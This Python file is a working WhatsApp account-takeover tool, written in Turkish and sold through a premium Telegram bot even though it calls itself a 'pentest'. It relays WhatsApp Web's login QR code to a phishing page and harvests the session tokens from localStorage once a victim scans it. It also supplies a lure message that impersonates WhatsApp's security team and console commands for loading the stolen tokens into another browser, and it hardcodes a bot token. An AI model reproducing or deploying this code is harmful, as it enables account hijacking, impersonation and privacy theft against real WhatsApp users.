import os
import json
import time
import base64
import uuid
import threading
import sqlite3
import logging
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32)
app.config['SECRET_KEY'] = os.urandom(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ===================== VERITABANI (SQLite) =====================

conn = sqlite3.connect('bot_data.db', check_same_thread=False)
cursor = conn.cursor()

# Tablolari olustur
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    premium_until TEXT,
    is_banned INTEGER DEFAULT 0,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    is_lifetime INTEGER DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS admins (
    user_id INTEGER PRIMARY KEY
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    user_id INTEGER,
    status TEXT DEFAULT 'waiting',
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    tokens TEXT
)
''')

# Admin ekle (bot sahibi)
cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (7497803165)")
conn.commit()

# ===================== VERITABANI FONKSIYONLARI =====================

def is_admin(user_id):
    cursor.execute("SELECT * FROM admins WHERE user_id = ?", (user_id,))
    return cursor.fetchone() is not None

def is_premium(user_id):
    cursor.execute("SELECT premium_until, is_lifetime, is_banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    if not result:
        return False
    premium_until, is_lifetime, is_banned = result
    if is_banned:
        return False
    if is_lifetime:
        return True
    if premium_until:
        try:
            until = datetime.fromisoformat(premium_until)
            if until > datetime.now():
                return True
        except:
            pass
    return False

def is_banned(user_id):
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1

def add_premium_lifetime(user_id, username="", first_name=""):
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, first_name, is_lifetime, premium_until)
        VALUES (?, ?, ?, 1, 'lifetime')
    """, (user_id, username, first_name))
    conn.commit()

def add_premium_temp(user_id, days=0, hours=0, username="", first_name=""):
    if days > 0:
        until = datetime.now() + timedelta(days=days)
    elif hours > 0:
        until = datetime.now() + timedelta(hours=hours)
    else:
        return
    
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, first_name, is_lifetime, premium_until)
        VALUES (?, ?, ?, 0, ?)
    """, (user_id, username, first_name, until.isoformat()))
    conn.commit()

def remove_premium(user_id):
    cursor.execute("UPDATE users SET premium_until = NULL, is_lifetime = 0 WHERE user_id = ?", (user_id,))
    conn.commit()

def ban_user(user_id):
    cursor.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
    conn.commit()

def unban_user(user_id):
    cursor.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
    conn.commit()

def get_user_info(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return cursor.fetchone()

def get_total_users():
    cursor.execute("SELECT COUNT(*) FROM users")
    return cursor.fetchone()[0]

def get_active_premium():
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_lifetime = 1 OR (premium_until IS NOT NULL AND premium_until > datetime('now'))")
    return cursor.fetchone()[0]

def get_banned_users():
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
    return cursor.fetchone()[0]

def save_link(link_id, user_id):
    cursor.execute("INSERT OR REPLACE INTO links (id, user_id) VALUES (?, ?)", (link_id, user_id))
    conn.commit()

def update_link_tokens(link_id, tokens):
    cursor.execute("UPDATE links SET status = 'active', tokens = ? WHERE id = ?", (json.dumps(tokens), link_id))
    conn.commit()

def get_link(link_id):
    cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
    return cursor.fetchone()

# ===================== WHATSAPP SESSION =====================

class WhatsAppSessionManager:
    def __init__(self):
        self.driver = None
        self.session_tokens = {}
        self.qr_code_data = None
        self.is_authenticated = False
        self.lock = threading.Lock()
        self.current_link_id = None
    
    def find_chrome_binary(self):
        """Chrome binary'ini otomatik bul"""
        import shutil
        chrome_paths = [
            "/usr/bin/google-chrome",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium",
            "/opt/google/chrome/chrome",
            "/snap/bin/chromium",
            "/snap/bin/google-chrome"
        ]
        for p in chrome_paths:
            if os.path.exists(p):
                logger.info(f"[+] Chrome bulundu: {p}")
                return p
        
        # which ile dene
        which_result = shutil.which("google-chrome") or shutil.which("chromium-browser") or shutil.which("chromium")
        if which_result:
            logger.info(f"[+] Chrome bulundu (which): {which_result}")
            return which_result
        
        logger.error("[!] Chrome binary bulunamadi!")
        return "/usr/bin/google-chrome"  # fallback
    
    def start_browser(self):
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        chrome_options.add_argument('--remote-debugging-port=9222')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-background-networking')
        chrome_options.add_argument('--disable-sync')
        chrome_options.add_argument('--disable-translate')
        chrome_options.add_argument('--disable-default-apps')
        chrome_options.add_argument('--mute-audio')
        chrome_options.add_argument('--no-first-run')
        chrome_options.add_argument('--hide-scrollbars')
        
        chrome_bin = self.find_chrome_binary()
        chrome_options.binary_location = chrome_bin
        
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            self.driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()),
                options=chrome_options
            )
        except Exception as e:
            logger.warning(f"Webdriver-manager hatasi, manuel deneniyor: {e}")
            try:
                self.driver = webdriver.Chrome(options=chrome_options)
            except Exception as e2:
                logger.error(f"Chrome baslatilamadi: {e2}")
                raise
        
        logger.info("[+] WhatsApp Web aciliyor...")
        self.driver.get("https://web.whatsapp.com")
        time.sleep(5)
    
    def get_qr_code_data(self):
        try:
            # Canvas'dan QR kodunu al
            qr_data = self.driver.execute_script("""
                const canvas = document.querySelector('canvas');
                if (!canvas) return null;
                return canvas.toDataURL('image/png');
            """)
            if qr_data:
                self.qr_code_data = qr_data
                logger.info("[+] QR kodu alindi!")
                return qr_data
            
            # Canvas yoksa, SVG veya img ara
            qr_data = self.driver.execute_script("""
                const svg = document.querySelector('svg[data-testid="qr"]');
                if (svg) return svg.outerHTML;
                const img = document.querySelector('img[alt*="QR"]');
                if (img) return img.src;
                return null;
            """)
            if qr_data:
                self.qr_code_data = qr_data
                logger.info("[+] QR kodu alindi (alternatif)!")
                return qr_data
                
        except Exception as e:
            logger.error(f"QR alinamadi: {e}")
        return None
    
    def monitor_session_tokens(self, link_id):
        max_wait = 120  # 2 dakika bekle
        start_time = time.time()
        
        logger.info(f"[*] Session token'lar bekleniyor... Link ID: {link_id}")
        
        while not self.is_authenticated and (time.time() - start_time) < max_wait:
            try:
                tokens = self.driver.execute_script("""
                    return {
                        'whatsapp-web-encrypted': localStorage.getItem('whatsapp-web-encrypted') || null,
                        'serverToken': localStorage.getItem('serverToken') || null,
                        'clientToken': localStorage.getItem('clientToken') || null,
                        'ref': localStorage.getItem('ref') || null,
                        'wab': localStorage.getItem('wab') || null,
                        'wavid': localStorage.getItem('wavid') || null,
                        'wa_sid': localStorage.getItem('wa_sid') || null
                    };
                """)
                
                if tokens.get('serverToken') and tokens.get('clientToken'):
                    with self.lock:
                        self.session_tokens = tokens
                        self.is_authenticated = True
                        update_link_tokens(link_id, tokens)
                    
                    logger.info(f"[+] HEDEF SESSION ELE GECIRILDI! Link ID: {link_id}")
                    
                    # WebSocket ile bildir
                    socketio.emit('authenticated', {'tokens': tokens, 'link_id': link_id})
                    return tokens
                    
            except Exception as e:
                logger.debug(f"Token kontrol hatasi: {e}")
            
            time.sleep(2)
        
        if not self.is_authenticated:
            logger.warning(f"[!] Session yakalanamadi (timeout). Link ID: {link_id}")
    
    def start_monitoring(self, link_id):
        self.current_link_id = link_id
        self.qr_code_data = None
        
        try:
            self.start_browser()
            time.sleep(3)
            qr = self.get_qr_code_data()
            
            if qr:
                # QR'i WebSocket ile gonder
                socketio.emit('qr_code', {'qr': qr, 'link_id': link_id})
                logger.info(f"[+] QR kodu WebSocket ile gonderildi. Link ID: {link_id}")
                
                # Session izlemeyi baslat
                monitor_thread = threading.Thread(target=self.monitor_session_tokens, args=(link_id,), daemon=True)
                monitor_thread.start()
            else:
                logger.error("[!] QR kodu alinamadi!")
                
        except Exception as e:
            logger.error(f"[!] Browser baslatma hatasi: {e}")
        
        return self.qr_code_data
    
    def close(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass

pentest = WhatsAppSessionManager()

# ===================== TELEGRAM BOT =====================

BOT_TOKEN = os.environ.get('BOT_TOKEN', "8665336598:AAEKosBgsibG1BVQK6ECpua2I4Y6p-Wi6Ms")
ADMIN_ID = 7497803165

# ===================== KULLANICI KOMUTLARI =====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    first_name = update.effective_user.first_name or ""
    
    # Ban kontrolu
    if is_banned(user_id):
        await update.message.reply_text("Hesabiniz yasaklanmistir. Yetkiliyle iletisime gecin.")
        return
    
    # Premium kontrolu
    if not is_premium(user_id) and user_id != ADMIN_ID:
        keyboard = [[InlineKeyboardButton("Premium Satin Al", url="https://t.me/admin_ile_iletisim")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Bu bot sadece premium kullanicilara ozeldir!\n\n"
            "Premium uyelik satin almak icin asagidaki butona tiklayin.\n\n"
            "Premium Ozellikler:\n"
            "- WhatsApp Session Yakalama\n"
            "- Sinirsiz Link Olusturma\n"
            "- 7/24 Destek",
            reply_markup=reply_markup
        )
        return
    
    # Premium kullanici veya admin - link olustur
    link_id = str(uuid.uuid4())[:8]
    base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
    unique_link = f"{base_url}/qr/{link_id}"
    
    save_link(link_id, user_id)
    
    keyboard = [
        [InlineKeyboardButton("Linki Kopyala", callback_data=f"copy_{link_id}")],
        [InlineKeyboardButton("Hedefe Gonderilecek Mesaj", callback_data=f"send_{link_id}")],
        [InlineKeyboardButton("Yeni Link", callback_data="new_link")],
        [InlineKeyboardButton("Durum Kontrol", callback_data=f"status_{link_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"WhatsApp Pentest Linki Olusturuldu\n\n"
        f"Link: {unique_link}\n\n"
        f"Link ID: {link_id}\n\n"
        f"Linki hedef kisiye gonder, QR kodu okuttugunda session otomatik yakalanacak.",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    data = query.data
    
    if data.startswith("copy_"):
        link_id = data.replace("copy_", "")
        base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
        link = f"{base_url}/qr/{link_id}"
        await query.edit_message_text(
            f"Link kopyalandi:\n\n{link}\n\nHedefe gonderebilirsin."
        )
    
    elif data.startswith("send_"):
        link_id = data.replace("send_", "")
        base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
        link = f"{base_url}/qr/{link_id}"
        await query.edit_message_text(
            f"Hedefe Gonderilecek Mesaj:\n\n"
            f"---------------\n"
            f"Merhaba,\n\n"
            f"Guvenlik nedeniyle WhatsApp Web hesabinizi dogrulamaniz gerekiyor.\n"
            f"Asagidaki linke tiklayip QR kodu telefonunuzdan okutun:\n\n"
            f"{link}\n\n"
            f'Tesekkurler,\n'
            f"WhatsApp Guvenlik Ekibi\n"
            f"---------------\n\n"
            f"Bu metni kopyalayip hedefe gonder."
        )
    
    elif data == "new_link":
        message = update.effective_message
        # Yeni start mesaji gonder
        await start(update, context)
    
    elif data.startswith("status_"):
        link_id = data.replace("status_", "")
        link_data = get_link(link_id)
        
        if link_data:
            status = link_data[2]
            if status == 'active':
                tokens = json.loads(link_data[4])
                token_json = json.dumps(tokens, indent=2)
                await query.edit_message_text(
                    f"HEDEF SESSION ELE GECIRILDI!\n\n"
                    f"Link ID: {link_id}\n\n"
                    f"Tokenlar:\n{token_json}\n\n"
                    f"Kullanmak icin WhatsApp Web'de F12 -> Console:\n\n"
                    f"localStorage.setItem('serverToken', '{tokens.get('serverToken', '')}');\n"
                    f"localStorage.setItem('clientToken', '{tokens.get('clientToken', '')}');\n"
                    f"localStorage.setItem('whatsapp-web-encrypted', '{tokens.get('whatsapp-web-encrypted', '')}');\n"
                    f"location.reload();"
                )
            else:
                base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
                link = f"{base_url}/qr/{link_id}"
                await query.edit_message_text(
                    f"Bekleniyor...\n\n"
                    f"Link ID: {link_id}\n"
                    f"Durum: QR kod henuz okutulmadi.\n\n"
                    f"Link: {link}"
                )
        else:
            await query.edit_message_text("Link bulunamadi.")

# ===================== ADMIN KOMUTLARI =====================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Bu komut sadece admin icindir.")
        return
    
    await update.message.reply_text(
        "ADMIN KONTROL PANELI\n\n"
        "/toplam - Toplam kullanici sayisi\n"
        "/kullanici ID - Kullanici bilgisi sorgula\n"
        "/ekle ID - Omur boyu premium ekle\n"
        "/vip ID SURE - Sureli premium (/vip 123 7 gun, /vip 123 1h saat)\n"
        "/sil ID - Premium kullanici sil\n"
        "/ban ID - Kullaniciyi yasakla\n"
        "/unban ID - Yasagi kaldir\n"
        "/duyuru mesaj - Tum kullanicilara duyuru gonder\n\n"
        "Ornekler:\n"
        "/ekle 123456789\n"
        "/vip 123456789 30\n"
        "/vip 123456789 1h"
    )

async def toplam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    total = get_total_users()
    premium = get_active_premium()
    banned = get_banned_users()
    
    await update.message.reply_text(
        f"Istatistikler\n\n"
        f"Toplam Kullanici: {total}\n"
        f"Premium Uye: {premium}\n"
        f"Yasakli: {banned}"
    )

async def kullanici_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanim: /kullanici ID")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("Gecersiz ID.")
        return
    
    user_info = get_user_info(target_id)
    if user_info:
        status = "Premium (Omur Boyu)" if user_info[5] == 1 else \
                "Premium (Sureli)" if user_info[3] else \
                "Premium Degil"
        
        ban_status = "Yasakli" if user_info[4] == 1 else "Temiz"
        
        await update.message.reply_text(
            f"Kullanici Bilgisi\n\n"
            f"ID: {user_info[0]}\n"
            f"Kullanici Adi: @{user_info[1] or 'Yok'}\n"
            f"Isim: {user_info[2] or 'Yok'}\n"
            f"Durum: {status}\n"
            f"Ban: {ban_status}\n"
            f"Kayit: {user_info[6]}"
        )
    else:
        await update.message.reply_text("Kullanici bulunamadi.")

async def ekle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanim: /ekle ID")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("Gecersiz ID.")
        return
    
    add_premium_lifetime(target_id)
    await update.message.reply_text(f"{target_id} kullanicisina OMUR BOYU premium verildi!")

async def vip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Kullanim:\n"
            "/vip ID GUN (/vip 123 7 - 7 gun)\n"
            "/vip ID SAAT (/vip 123 1h - 1 saat)"
        )
        return
    
    try:
        target_id = int(context.args[0])
        sure = context.args[1]
        
        if sure.endswith('h'):
            hours = int(sure.replace('h', ''))
            add_premium_temp(target_id, hours=hours)
            await update.message.reply_text(f"{target_id} kullanicisina {hours} saatlik premium verildi!")
        else:
            days = int(sure)
            add_premium_temp(target_id, days=days)
            await update.message.reply_text(f"{target_id} kullanicisina {days} gunluk premium verildi!")
    except:
        await update.message.reply_text("Gecersiz format. Orn: /vip 123 7 veya /vip 123 1h")

async def sil_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanim: /sil ID")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("Gecersiz ID.")
        return
    
    remove_premium(target_id)
    await update.message.reply_text(f"{target_id} kullanicisinin premiumu silindi!")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanim: /ban ID")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("Gecersiz ID.")
        return
    
    ban_user(target_id)
    await update.message.reply_text(f"{target_id} kullanicisi yasaklandi!")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanim: /unban ID")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("Gecersiz ID.")
        return
    
    unban_user(target_id)
    await update.message.reply_text(f"{target_id} kullanicisinin yasagi kaldirildi!")

async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanim: /duyuru mesaj")
        return
    
    mesaj = " ".join(context.args)
    
    # Tum kullanicilara mesaj gonder
    cursor.execute("SELECT user_id FROM users WHERE is_banned = 0")
    users = cursor.fetchall()
    
    sent = 0
    failed = 0
    
    for (uid,) in users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"DUYURU\n\n{mesaj}\n\n-- Admin"
            )
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    await update.message.reply_text(
        f"Duyuru Gonderildi!\n\n"
        f"Gonderilen: {sent}\n"
        f"Basarisiz: {failed}\n"
        f"Toplam: {len(users)}"
    )

# ===================== FLASK ROUTES =====================

@app.route('/')
def index():
    return render_template('whatsapp_clone.html')

@app.route('/qr/<link_id>')
def qr_page(link_id):
    link_data = get_link(link_id)
    if not link_data:
        return "Link gecersiz veya suresi dolmus.", 404
    return render_template('whatsapp_clone.html', link_id=link_id)

@app.route('/api/qr-code/<link_id>')
def get_qr_code(link_id):
    link_data = get_link(link_id)
    if not link_data:
        return jsonify({'error': 'Gecersiz link'}), 404
    
    # Bu link icin session baslatilmamis mi kontrol et
    session_key = f"started_{link_id}"
    if not hasattr(get_qr_code, 'sessions'):
        get_qr_code.sessions = {}
    
    if link_id not in get_qr_code.sessions or not get_qr_code.sessions[link_id]:
        get_qr_code.sessions[link_id] = True
        
        # Session manager'i sifirla
        pentest.session_tokens = {}
        pentest.is_authenticated = False
        pentest.qr_code_data = None
        
        # Browser'i baslat (ayri thread'de)
        thread = threading.Thread(target=pentest.start_monitoring, args=(link_id,), daemon=True)
        thread.start()
        
        logger.info(f"[*] Browser baslatildi. Link ID: {link_id}")
        
        # QR'in olusmasi icin bekle
        time.sleep(5)
    
    # QR varsa gonder
    if pentest.qr_code_data:
        return jsonify({'status': 'success', 'qr': pentest.qr_code_data})
    
    # Yoksa bekliyor
    return jsonify({'status': 'loading'})

@app.route('/api/check-session/<link_id>')
def check_session(link_id):
    link_data = get_link(link_id)
    if link_data and link_data[2] == 'active':
        tokens = json.loads(link_data[4])
        return jsonify({
            'status': 'success',
            'message': 'QR kod tarandi! Hesap ele gecirildi.',
            'tokens': tokens
        })
    return jsonify({'status': 'waiting'})

# ===================== MAIN =====================

def run_telegram_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Kullanici komutlari
    application.add_handler(CommandHandler("start", start))
    
    # Admin komutlari
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("panel", admin_panel))
    application.add_handler(CommandHandler("toplam", toplam_command))
    application.add_handler(CommandHandler("kullanici", kullanici_command))
    application.add_handler(CommandHandler("ekle", ekle_command))
    application.add_handler(CommandHandler("vip", vip_command))
    application.add_handler(CommandHandler("sil", sil_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("duyuru", duyuru_command))
    
    # Buton handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info("[+] Telegram bot baslatildi!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        # Telegram bot thread'i
        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
        bot_thread.start()
        
        port = int(os.environ.get('PORT', 5000))
        logger.info(f"[*] Pentest sunucusu: http://0.0.0.0:{port}")
        socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        pentest.close()
